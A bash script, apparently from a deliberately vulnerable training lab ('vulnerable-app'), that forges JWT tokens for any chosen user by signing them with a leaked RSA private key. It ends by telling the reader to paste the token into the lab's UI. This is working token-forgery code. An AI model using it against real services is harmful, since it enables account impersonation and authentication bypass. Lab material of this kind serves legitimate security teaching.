#!/bin/bash
# OpenSSL을 사용하여 JWT 토큰 생성 스크립트
# 사용법: ./generate_token.sh <user_id> <username> <email>

USER_ID=${1:-2}
USERNAME=${2:-"bob"}
EMAIL=${3:-"bob@example.com"}

# 유출된 개인키 경로 (스크립트와 같은 디렉토리)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PRIVATE_KEY="${SCRIPT_DIR}/leaked_private_key.pem"

# 현재 시간 (Unix timestamp)
IAT=$(date +%s)
EXP=$((IAT + 86400))  # 24시간 후

# JWT 헤더 (RS256 알고리즘)
HEADER='{"alg":"RS256","typ":"JWT"}'

# JWT 페이로드 (한 줄로 생성)
PAYLOAD="{\"user_id\":${USER_ID},\"username\":\"${USERNAME}\",\"email\":\"${EMAIL}\",\"iat\":${IAT},\"exp\":${EXP},\"iss\":\"vulnerable-app\"}"

# Base64 URL 인코딩 (padding 제거)
HEADER_B64=$(echo -n "$HEADER" | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 | tr -d '=' | tr '/+' '_-')

# 서명할 데이터
SIGNATURE_INPUT="${HEADER_B64}.${PAYLOAD_B64}"

# OpenSSL로 서명 (SHA256)
SIGNATURE=$(echo -n "$SIGNATURE_INPUT" | openssl dgst -sha256 -sign "$PRIVATE_KEY" -binary | base64 | tr -d '=' | tr '/+' '_-')

# JWT 토큰 조합
TOKEN="${HEADER_B64}.${PAYLOAD_B64}.${SIGNATURE}"

echo "생성된 토큰:"
echo "$TOKEN"
echo ""
echo "토큰 정보:"
echo "- User ID: ${USER_ID}"
echo "- Username: ${USERNAME}"
echo "- Email: ${EMAIL}"
echo ""
echo "이 토큰을 UI의 '4단계: 직접 토큰 입력하여 테스트'에 붙여넣어 테스트할 수 있습니다."

